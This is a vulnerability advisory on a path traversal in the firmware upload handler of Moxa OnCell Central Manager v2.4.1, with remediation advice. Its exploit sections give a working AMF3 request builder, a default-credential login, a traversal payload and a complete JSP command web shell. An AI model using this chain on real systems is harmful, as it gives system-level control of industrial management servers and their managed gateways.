# Moxa OnCell Central Manager v2.4.1 - uploadFw path traversal writing an archive outside the firmware directory

Repository: https://github.com/Exploit-Garbage/0day-Rubbish
Contact: disclosure@0day-rubbish.com

## 1. Overview

Moxa OnCell Central Manager is the centralised management server for Moxa OnCell industrial cellular routers and gateways. It enrolls devices, stores their configuration profiles and credentials, and distributes firmware images to them, which places it in the management plane above a fleet of cellular gateways that are usually deployed on operational technology segments. The v2.4.1 build is a Windows application. It installs Apache Tomcat 6.0.39 as the service `oncell_central_web_server`, running as `LocalSystem`, and deploys the management application as `OnCellCentral.war` under the package namespace `com.moxa.iw.*`. The browser front end communicates with the server through BlazeDS `flex-messaging` 4.7.3 AMF3 remoting, mounted at `/OnCellCentral/messagebroker/amf`. Application state lives in an embedded Apache Derby 10.10.2.0 database, and a Jersey REST interface is published under `/v1/*` and `/v1/HTTP/*`.

This advisory documents a path traversal in the firmware upload handler of that application. `com.moxa.iw.service.FileUpload.uploadFw(String fileName, String desc, byte[] data)` concatenates the client-supplied `fileName` into the destination path and writes the client-supplied `data` to it. Nothing between the AMF decoder and the `FileOutputStream` validates the name: no `File.getName()` reduction, no canonicalisation, no separator rejection, no extension allowlist. Because the upload directory sits inside the deployed web application root, a name containing `..\` segments escapes the upload directory, and because the destination is served and compiled by the same Tomcat instance, the write primitive is a code execution primitive. The service account is `LocalSystem`, so command execution through the written page is administrative over the host and over everything the management server controls.

The finding is post-authentication: the BlazeDS `FileUpload` destination is protected by `<security-constraint ref="trusted-user"/>`, and the broker applies that constraint before the destination is invoked. The chain therefore carries `PR:H` in the primary scoring. That prerequisite is weakened in practice by two separate conditions that are themselves documented in this advisory: the application ships the `admin` account with `admin` as its password, and the BlazeDS login path accepts that account while the REST login path explicitly refuses it. An installation that never changed the password is compromised by an attacker who knows only the shipped credential.

The work behind this advisory was performed against an installation of the shipped build in an authorised laboratory environment, over plain HTTP, with no man-in-the-middle position and no modification of the application. The claim made here is limited to v2.4.1. The static observations about the handler are complete for that build; the dynamic observations were collected on one host, and the negative result about unauthenticated reachability is an argument from an enumeration of the application's sinks, not a proof.

## 2. Vulnerability Summary

- **Defect class**: path traversal (CWE-22) in an authenticated file upload handler, chained into unrestricted upload of a dangerous file type (CWE-434), with the resulting JSP page executing as the Windows system account.
- **Sink**: `com.moxa.iw.service.FileUpload.uploadFw`, implemented in `FileUpload.java`, method body spanning lines 33 to 60 of that file. The method builds a `StringBuffer` from `getRealPath("/fileUploadTmp")`, a literal backslash, a formatted timestamp, an underscore and the raw `fileName` argument, then opens a `FileOutputStream` on the result.
- **Taint source**: the third element of the AMF `RemotingMessage` body array, delivered to the `FileUpload` destination by an authenticated session. The value is a plain AMF3 string; the decoder performs no character filtering, and no layer above the sink validates it either.
- **Traversal mechanics**: the timestamp and underscore prefix means the first `..` in the payload is absorbed into a literal path component named `<timestamp>_..`. Two further `..` segments then climb from `fileUploadTmp` to `OnCellCentral`, so the payload `..\..\..\shell.jsp` resolves to the web application root. The depth is fixed and deterministic, so no iteration or guessing is required.
- **Precondition**: a session holding `flexclient-user`. Where the shipped default credential is unchanged, that session is obtained with `admin` / `admin` over the AMF endpoint.
- **Impact**: remote code execution as `LocalSystem` on the management server, followed by control of the managed OnCell fleet.
- **Score**: 7.2 High, `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` - the authenticated reading; a deployment that retains the default credential collapses to the unauthenticated reading at 9.8.
- **Novelty**: no published identifier covers this code path. The product's known records are BlazeDS deserialization (CVE-2017-5641, fixed here), XML external entity (CVE-2015-3269), and pre-2.2 authentication issues (CVE-2015-6480, CVE-2015-6481). This one is a Moxa application defect in which AMF is only the transport.

## 3. Authentication Boundary

The application has two independent login implementations, and they do not agree with each other.

The REST implementation lives in `AuthorizeLogin.Authorize_via_RESTFUL`. It authenticates against the Derby `LOGIN_USER` table and contains an explicit branch that refuses the shipped default account, returning the hardcoded string `Can not use default`. An operator testing the product through its REST interface therefore observes that the default credential is blocked, and can reasonably conclude that the shipped account is harmless until it is changed.

The BlazeDS implementation is `RdbmsLoginCommand.doAuthentication`, which routes through `RequestController.DO_LOGIN`. It reads the `LOGIN_NAME`, `LOGIN_PWD` and `USER_ENABLE` columns, compares the MD5 digest of the supplied password with the stored digest, and, on success, creates the authenticated session and grants the `flexclient-user` role. It contains no default-account check. The shipped `admin` row stores `21232f297a57a5a743894a0e4a801fc3`, the MD5 digest of `admin`, with `USER_ENABLE=1`, and there is no forced password change on first login and no expiry flag that would invalidate it. In the laboratory installation the AMF login with `admin` / `admin` succeeded and returned an `AcknowledgeMessage` carrying `onResult` and `success`, while the REST login for the same account was refused.

The role grant is what makes the sink reachable. The `FileUpload` destination is declared with `<security-constraint ref="trusted-user"/>` in the BlazeDS messaging configuration, and the broker evaluates the constraint twice - once at the endpoint and once on the destination - before `routeMessageToService` dispatches the call. The `trusted-user` constraint is satisfied by any successfully authenticated session, and every successful login through `RdbmsLoginCommand` receives `flexclient-user`. There is no per-destination authorisation beyond that role, so a session created for ordinary device monitoring can also invoke the firmware upload operation.

The boundary matters for scoring and for exploitation. It means the vulnerability is not pre-authentication: an anonymous client that posts the upload message without a session is rejected by the constraint before the `FileUpload` service is instantiated. It also means the boundary is thin in the common deployment, because the shipped credential satisfies it and the AMF path does not implement the default-account refusal that the REST path advertises.

For completeness, the unauthenticated attack surface was enumerated rather than assumed. Moxa's application code contains no command execution sink of its own: the only use of `Runtime.getRuntime()` anywhere in the application is a `freeMemory()` call used for a memory statistic. The four file-write sinks in the application either require the same `trusted-user` role or write a fixed file name with a `.txt` extension outside the web application, which gives no traversal and no executable extension. The BlazeDS endpoint does deserialize AMF3 before authentication, but CVE-2017-5641 is fixed in this build by a `ClassDeserializationValidator` allowlist, and within that allowlist nothing carries a gadget: the `com.moxa.iw.*` classes implement neither `Externalizable` nor a dangerous `readObject`, their dangerous setters are static and therefore not reachable through AMF3 property binding, the `flex.messaging` classes read only already-validated typed fields, and the standard commons-collections and Spring gadget chains are absent from the allowlist. The AJP connector on 8009 is exposed and vulnerable to the Ghostcat class of file read, but that primitive reads files inside the web application, cannot read the Derby database credentials, and writes a fixed `.txt` name outside the web application, so the two primitives do not compose into execution. No unauthenticated route to the sink was found.

## 4. Attack Surface

The installation published two connectors on all interfaces: the Tomcat HTTP connector, 8080 in the verified installation, and the AJP connector on 8009. The AMF endpoint is `/OnCellCentral/messagebroker/amf` and accepts `application/x-amf` POST bodies. The REST surface is `/v1/*` and `/v1/HTTP/*`. The interesting surface for this advisory is the AMF endpoint, because it is the only transport that reaches the `FileUpload` destination.

An AMF request is a binary envelope followed by one or more serialised messages:

```
u16 version = 3
u16 headerCount = 0
u16 bodyCount = 1
body:
  u16 + bytes  targetURI   ("" for remoting)
  u16 + bytes  responseURI ("/1" or "")
  u32          length      (0, meaning "read to end")
  u8           0x11        (AMF3 marker)
  AMF3 value               (the message object or an array of them)
```

Two message classes matter. `flex.messaging.messages.CommandMessage` carries broker commands; `operation=8` is `LOGIN` and its `body` is the base64 encoding of `user:password`. `flex.messaging.messages.RemotingMessage` carries a service invocation: `destination` names the configured destination, `operation` names the method, and `body` is an AMF3 array of the method arguments. The `FileUpload` destination maps to `com.moxa.iw.service.FileUpload`, and `uploadFw` is its only interesting operation.

The destination is not hidden: it is part of the normal application, invoked by the firmware upload page of the management console. An authenticated user with browser access to the console can therefore reach the same operation without any tooling, which is one reason the defect is easy to reproduce and easy to miss in review: the request looks like ordinary product functionality.

## 5. Sink Identification

The sink is the whole of `uploadFw`, and it is short enough to read in full:

```java
public void uploadFw(String fileName, String desc, byte[] data) throws Exception {
    SimpleDateFormat sdFormat = new SimpleDateFormat("yyyyMMdd-HHmmss");
    String absoluteDiskPath = FlexContext.getServletConfig()
            .getServletContext().getRealPath("/fileUploadTmp");   // <webroot>\fileUploadTmp
    StringBuffer fileLocation = new StringBuffer();
    fileLocation.append(absoluteDiskPath);
    fileLocation.append("\\");
    String strDate = sdFormat.format(new Date());
    fileLocation.append(strDate);
    fileLocation.append("_");
    fileLocation.append(fileName);
    FileOutputStream saveFile = new FileOutputStream(fileLocation.toString());
    saveFile.write(data);
    saveFile.close();
}
```

The `fileName` parameter goes from the parameter list to the `StringBuffer` with no intermediate call. The negative evidence is as important as the positive evidence: the method contains no `getName()`, no `getCanonicalPath()`, no `normalize()`, no `replaceAll()`, no `Pattern`, no `indexOf("..")`, no `File.isAbsolute()` check and no post-write `getCanonicalPath().startsWith(uploadDir)` comparison. The only processing applied to the name is the concatenation itself. `desc` is not used in the path at all, and `data` is written verbatim, so both the name and the content are fully attacker-controlled.

The path is a Windows path. `getRealPath("/fileUploadTmp")` returns something like `<webroot>\fileUploadTmp`, the separator appended by the code is a literal backslash, and the resulting string is resolved by the Windows filesystem layer, which treats both `\` and `/` as separators and resolves `..` lexically per component. That resolution is what the payload exploits. The service account is `LocalSystem`, which has `Full Control` on the Tomcat installation directory, so the web application root is writable by the process performing the upload. There is no permission boundary between the upload directory and the web application root to stop the escape.

The class is in the application's own code, not in a third-party library. That matters for two reasons: the vulnerability cannot be patched by upgrading a dependency, and the fix has to be written by the vendor in `uploadFw` or in a helper it calls.

## 6. Source Identification

The source is the third element of the `RemotingMessage` argument array, and the array is built by the client:

```python
args = dense_array([sval(fname), sval("x"), byteval(data)])
props = [("operation", sval("uploadFw")), ("source", sval("")), ("body", args),
         ("messageId", sval(mid)), ("destination", sval("FileUpload")), ("clientId", sval("")),
         ("timestamp", ai(0)), ("timeToLive", ai(0)), ("headers", null())]
rm = bean("flex.messaging.messages.RemotingMessage", props)
```

`sval` writes an AMF3 string with the type marker, `byteval` writes an AMF3 byte array, and `dense_array` writes an AMF3 dense array. There is no client-side filtering to bypass and none to satisfy: the server-side decoder hands the string to the destination as a Java `String`, the BlazeDS remoting layer maps argument position to parameter type, and `fileName` is a `String`, so no conversion step can reject a value containing separators or dot segments. The length limit on AMF3 strings is the only bound, and it is far beyond what a short traversal payload needs.

The response confirms that the taint reaches the model object unchanged. A successful upload returns an `AcknowledgeMessage` whose body contains a `com.moxa.iw.model.UploadFile` instance, and that instance carries the fields the server populated while building the path:

```
createtime=20260819-110001  filename=20260819-110001_..\..\..\shell.jsp
currentPath=/fileUploadTmp/20260819-110001_..\..\..\shell.jsp
```

The echoed `filename` and `currentPath` contain the traversal sequence verbatim. That is the strongest single piece of evidence that no sanitisation happens anywhere between the wire and the filesystem: whatever filtering a reviewer might hypothesise, the object returned to the client still carries the raw `..` segments.

## 7. Data Flow

The chain has six steps, and each one is observable:

1. The client posts an AMF envelope to `/OnCellCentral/messagebroker/amf` with a `RemotingMessage` wrapped in a dense array.
2. `MessageBrokerFilter` reads the envelope, `LegacyFilter` inspects the body, sees the array branch and leaves legacy mode off, and `MessageBrokerFilter.getDataAsMessage()` hands the message to `MessageBroker.serviceMessage()`.
3. The broker resolves `destination=FileUpload` to `com.moxa.iw.service.FileUpload`, checks the `trusted-user` constraint against the session, and invokes `uploadFw` by reflection with the three decoded arguments.
4. `uploadFw` concatenates `getRealPath("/fileUploadTmp")`, `\`, the timestamp, `_` and the attacker string into one path.
5. `new FileOutputStream(path)` creates the file and `write(data)` stores the attacker bytes.
6. The client requests the written page from the same Tomcat instance, which compiles and executes it.

In shorthand, with the verified values:

```
fileName = "..\\..\\..\\shell.jsp"
absoluteDiskPath = "<webroot>\\fileUploadTmp"
fileLocation = "<webroot>\\fileUploadTmp\\20260819-110001_..\\..\\..\\shell.jsp"
```

The path resolves as follows. The Windows resolver splits on separators and processes components left to right:

| Component | Effect |
|-----------|--------|
| `<webroot>` | start of the web application root |
| `fileUploadTmp` | enter the upload directory |
| `20260819-110001_..` | a literal directory name ending in two dots - not a traversal |
| `..` | climb back to `fileUploadTmp` |
| `..` | climb to `<webroot>` |
| `shell.jsp` | create the file in `<webroot>` |

That table is the core of the bug. The `<timestamp>_` prefix means the first `..` cannot act as a traversal, so the payload needs three segments rather than two. Reviewers who reason about the depth from the string alone sometimes conclude that two `..` would be enough and that the payload therefore cannot work; the dynamic result shows the opposite, and the filesystem evidence settles it. After the exploitation run, `fileUploadTmp` contained zero files (`Count=0`) and `shell.jsp` was present in `<webroot>`, which is exactly what the resolution table predicts: the file never existed inside the upload directory at any point.

The write is not a blind write. The upload response carries the resulting `currentPath`, so a client can confirm placement without filesystem access, and the subsequent `GET` confirms that Tomcat serves the file. The two observations together close the loop between the path string and the file on disk.

## 8. Exploit Construction

Two requests are required: a login `CommandMessage` and an upload `RemotingMessage`. Both are wrapped in an AMF3 dense array for the reason described below.

The AMF3 encodings needed are small and can be written by hand:

```python
def u29(b):                     # variable-length unsigned 29-bit integer
    if b <= 0x7F:
        return bytes([b])
    if b <= 0x3FFF:
        return bytes([(b >> 7) | 0x80, b & 0x7F])
    if b <= 0x1FFFFF:
        return bytes([(b >> 14) | 0x80, ((b >> 7) & 0x7F) | 0x80, b & 0x7F])
    return bytes([(b >> 22) | 0x80, ((b >> 15) & 0x7F) | 0x80, ((b >> 8) & 0x7F) | 0x80, b & 0xFF])

def sval(s):                    # string with type marker: 0x06 + u29((len<<1)|1) + utf8
    b = s.encode("utf-8"); return b"\x06" + u29((len(b) << 1) | 1) + b

def snt(s):                     # string without type marker, used for class and property names
    b = s.encode("utf-8"); return u29((len(b) << 1) | 1) + b

def ai(i):                      # integer: 0x04 + u29(value)
    return b"\x04" + u29(i & 0x1FFFFFFF)

def byteval(ba):                # byte array: 0x0c + u29((len<<1)|1) + bytes
    return b"\x0c" + u29((len(ba) << 1) | 1) + ba

def dense_array(vals):          # dense array: 0x09 + u29((count<<1)|1) + 0x01 + values
    return b"\x09" + u29((len(vals) << 1) | 1) + b"\x01" + b"".join(vals)

def bean(cls, props):           # typed object: 0x0a + u29(3|(count<<4)) + class + names + values
    out = b"\x0a" + u29(3 | (len(props) << 4)) + snt(cls)
    for nm, _ in props: out += snt(nm)
    for _, v in props: out += v
    return out
```

The login message carries `operation=8` and a `body` of base64 `admin:admin`:

```python
props = [("operation", ai(8)),
         ("body", sval(base64.b64encode(b"admin:admin").decode())),
         ("messageId", sval(mid)), ("destination", sval("")), ("clientId", sval("")),
         ("timestamp", ai(0)), ("timeToLive", ai(0)), ("headers", null())]
cm = bean("flex.messaging.messages.CommandMessage", props)
body = envelope(dense_array([cm]))
```

The upload message names the destination and the method, and passes the traversal payload as the first argument, an ignored description as the second, and the JSP source as a byte array third:

```python
JSP_SHELL = (b'<%@ page import="java.io.*" %><%\n'
             b'String cmd=request.getParameter("cmd");\n'
             b'if(cmd!=null){Process p=Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",cmd});\n'
             b'BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));\n'
             b'String l;StringBuilder sb=new StringBuilder();while((l=br.readLine())!=null)sb.append(l).append("\\n");\n'
             b'br.close();p.waitFor();out.print(sb.toString());}\n%>')

args = dense_array([sval("..\\..\\..\\shell.jsp"), sval("x"), byteval(JSP_SHELL)])
props = [("operation", sval("uploadFw")), ("source", sval("")), ("body", args),
         ("messageId", sval(mid)), ("destination", sval("FileUpload")), ("clientId", sval("")),
         ("timestamp", ai(0)), ("timeToLive", ai(0)), ("headers", null())]
rm = bean("flex.messaging.messages.RemotingMessage", props)
```

Both requests are sent to `/OnCellCentral/messagebroker/amf` with `Content-Type: application/x-amf`, the second with the `JSESSIONID` returned by the first.

The dense-array wrapping is not cosmetic. When a single `CommandMessage` or `RemotingMessage` is sent as the top-level AMF body, the BlazeDS `LegacyFilter` treats it as a legacy client message, rewrites it into a `RemotingMessage` with an empty destination, and the broker answers with error code 10004, `destination id not registered`. Wrapping the message in an array makes `LegacyFilter.isArray()` recognise a message inside the body, so the filter sets its legacy flag to false and passes the body through untouched to `MessageBrokerFilter.getDataAsMessage()` and then `serviceMessage()`. The same wrapping is required for the login message; without it, the login itself fails with the same error.

The JSP payload needs no imports beyond `java.io.*`, uses `Runtime.getRuntime().exec` with an explicit `cmd.exe /c` argument vector, reads the process output, and waits for completion so the HTTP response carries the command output. The page is placed at `<webroot>\shell.jsp`, so its URL is `/OnCellCentral/shell.jsp?cmd=<command>`.

The proof of concept published with this advisory implements exactly these two requests plus the follow-up `GET`. It takes `--target` and `--port`, defaults to the documentation address `192.0.2.10` and to port 80, and must be pointed at the connector the deployment actually exposes - 8080 in the verified installation, with `--app` available if the web application context was renamed.

## 9. Dynamic Verification

The chain was executed against an installation of the shipped v2.4.1 build from the same host, over HTTP on the loopback interface, using a standard-library client. No proxy, no man-in-the-middle, no patching of the server, and no filesystem access to place the shell. The transcript of the run:

```
[*] target 127.0.0.1:8080  traversal_payload='..\\..\\..\\shell.jsp'
[login] HTTP 200  JSESSIONID=<session>  onResult+success=True
[upload] HTTP 200  onResult=True  resp_len=1078
[jsp cmd=echo RCE_OK_MARKER] HTTP 200  body=RCE_OK_MARKER
[jsp cmd=whoami] HTTP 200  body=nt authority\system
[*] done
```

The login response was an `AcknowledgeMessage` whose body contained `onResult` and `success`, and the `Set-Cookie` header carried the new `JSESSIONID`. The upload response was also a successful `AcknowledgeMessage`, 1078 bytes, containing the `com.moxa.iw.model.UploadFile` object with the traversal sequence echoed in `filename` and `currentPath` as shown in section 6.

Filesystem evidence on the target side:

| Path | Size | Content / observation |
|------|------|-----------------------|
| `<webroot>\shell.jsp` | 394 B | the uploaded JSP page, present in the web application root |
| `<webroot>\rce_marker.txt` | 12 B | `uid_check `, written by the page through a second command |
| `<webroot>\fileUploadTmp\` | 0 entries | empty after the run - the payload never landed there |

The empty upload directory is the decisive artefact. If the traversal had failed, the file would have been created inside `fileUploadTmp` under the mangled name; it was not. The 394-byte page in the web application root and the 12-byte marker written by a subsequent command together show that the page was compiled and executed, not merely stored.

Command execution returned `nt authority\system` for `whoami`, which confirms the service account and therefore the impact level. The marker file was written by the JSP page itself (`echo uid_check > rce_marker.txt`), which separates "the page executed" from "the page echoed something the server already had".

Limits of the verification: one host, one build, one operating system version. The traversal depth is derived from the code and confirmed on Windows, whose path resolver treats `..` lexically; a build on a different filesystem path or a differently configured connector would need its own confirmation. The unauthenticated case was not demonstrated, because it is the negative result argued in section 3, and no attempt was made to chain the AJP file-read primitive.

## 10. Reachability and Security Impact

Reachability has three conditions. First, the Tomcat HTTP connector must be reachable from the attacker's position; the verified installation bound it to all interfaces on 8080, and management servers of this class are usually reachable from the corporate network and often from the device network as well. Second, the attacker must hold a session with `flexclient-user`; that role is granted to every successful login, and the shipped credential satisfies it. Third, the attacker must be able to send an `application/x-amf` POST; no browser is required, since the message can be constructed by hand as shown above.

The vulnerability is not reachable anonymously. The security constraint is checked at the endpoint and again at the destination before the service is invoked, and the application's other sinks do not provide an alternative route: no exec sink exists in the application code, the other write sinks are either behind the same role or restricted to fixed `.txt` names outside the web application, the AMF3 deserialization path is constrained by the `ClassDeserializationValidator` allowlist and contains no gadget, and the AJP file-read primitive reads only inside the web application and cannot be composed with a write into an executable location. What makes the finding serious despite `PR:H` is that the privilege is a shipped default that the AMF path accepts while the REST path refuses, so an installation that never changed the password is effectively unauthenticated for this purpose.

Impact is host-level. The uploaded page executes as `LocalSystem`, which is the highest local privilege on Windows and exceeds the privileges the management application itself needs. From that position an attacker can read the Derby database, including the `LOGIN_USER` table and its password digests, extract stored device credentials and profiles, modify or replace firmware images before they are distributed to the managed OnCell devices, write additional persistence, and use the server's network position to reach the device estate. Because the server is the enrollment and configuration authority for the fleet, compromise of the server is compromise of every managed gateway that trusts it. Availability impact follows from the same access: the service, the database and the firmware repository can be stopped, corrupted or deleted.

The scoring follows from those facts. `AV:N` because the endpoint is network-reachable. `AC:L` because the payload is deterministic: the traversal depth is fixed by the code, the message format is stable, and no race or environment guess is involved. `PR:H` because a `flexclient-user` session is required by the constraint. `UI:N` because no user action is needed beyond the attacker's own requests. `S:U` because the vulnerable service and the impacted host account are in the same security scope. `C:H`, `I:H`, `A:H` because system-level execution exposes, modifies and can destroy everything the server holds. The base score is 7.2. Where the shipped default credential is retained, the effective privileges required drop to none and the same chain reads `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8; that reading is deployment-conditional and is not the primary score of this advisory.

## 11. Fix Recommendations

For the vendor, in the order that removes the most risk per change:

1. Never build a filesystem path from a client string. Generate the stored name server-side from a UUID or a sequence number, keep the client name only as a database column for display, and never pass it to a file API.
2. If the client name must influence the stored name, reduce it to `new File(fileName).getName()`, reject any value containing `/`, `\`, `..` or a NUL byte, and then verify with `getCanonicalPath()` that the result is still inside the upload directory before opening the stream - the canonical check must be the last step, after any decoding.
3. Move the upload directory out of the deployed web application, to a path the connector does not serve and the JSP servlet cannot reach.
4. Disable script execution for any directory that receives user content, including JSP compilation, and serve uploaded files through a handler that sets a fixed `Content-Type` and `Content-Disposition` instead of letting the container interpret the extension.
5. Apply the default-credential refusal to the AMF login path. The REST path already contains the `Can not use default` branch; the BlazeDS `RdbmsLoginCommand` path must enforce the same rule, force a password change at first login, and disable or delete the shipped `admin` row during installation.
6. Stop running the Tomcat service as `LocalSystem`. A dedicated service account with write access limited to the upload and log directories converts this defect from host compromise into a bounded application compromise.
7. Replace Tomcat 6.0.39, which no longer receives security support, and review the AMF surface: restrict `/OnCellCentral/messagebroker/amf` to management networks, and disable the AJP connector on 8009 if it is not required.
8. Audit every other destination that takes a file name or a path, since the same concatenation style may be present elsewhere in the application.

For operators who cannot patch immediately:

- Restrict the HTTP connector and the AJP connector to management interfaces and monitoring networks, and place the server behind an authenticating proxy rather than exposing it broadly.
- Change the `admin` password and any other shipped account, and verify the change applies to the AMF login path rather than only to the REST interface.
- Monitor the web application root for new `.jsp` files and for files whose modification time does not match a deployment, and alert on `fileUploadTmp` entries whose names contain `..`.
- Log AMF requests to the `FileUpload` destination and review them for traversal sequences, since the operation is rare outside firmware updates.
- Treat the server as sensitive infrastructure: it holds device credentials and distributes firmware, so its compromise should trigger rotation of the managed device credentials.

## 12. CWE

- **CWE-22, Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')** - primary. The `fileName` argument is concatenated into a path with no restriction, and `..` segments are resolved by the filesystem, allowing the write to escape `fileUploadTmp`. This is the defect as written in the code and the one the vendor must fix.
- **CWE-434, Unrestricted Upload of File with Dangerous Type** - the direct consequence and the reason the traversal is code execution rather than an arbitrary write. The upload directory is inside a deployed web application, the client controls the extension, and the container compiles the file when it is requested. Both conditions are needed for the impact, which is why the two weaknesses are reported together rather than as separate findings.
- **CWE-798, Use of Hard-coded Credentials** - a contributing condition. The shipped `admin` / `admin` account, with the MD5 digest `21232f297a57a5a743894a0e4a801fc3` stored in `LOGIN_USER`, is what makes the privilege prerequisite nearly free in the default configuration. It is not the defect of this advisory, but it changes the practical severity and belongs in the remediation plan.
- **CWE-602 / CWE-863 considerations** - the default-account refusal exists in `AuthorizeLogin.Authorize_via_RESTFUL` but not in the BlazeDS login path, which is an authorization-consistency defect in its own right. It is reported here as context rather than as a separate advisory, because the same fix that closes the traversal removes the value of an unauthenticated session.
- **Not CWE-502.** The AMF transport does deserialize data before authentication, and the product has a prior deserialization record, but this build enforces a `ClassDeserializationValidator` allowlist and the chain uses only allowlisted `CommandMessage` and `RemotingMessage` types. The root cause here is path construction, not object deserialization.
- **Not CWE-78 primarily.** Command execution is the outcome of requesting the uploaded page, not of a shell string built by the server. The shell is a consequence of CWE-434; the injection of a command string into a server-side shell is not what the application does.
- **Scoring link**: the primary reading is 7.2 High, `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`, reflecting a network-reachable, low-complexity chain that requires an authenticated session; the deployment-conditional reading without the shipped credential prerequisite is 9.8.
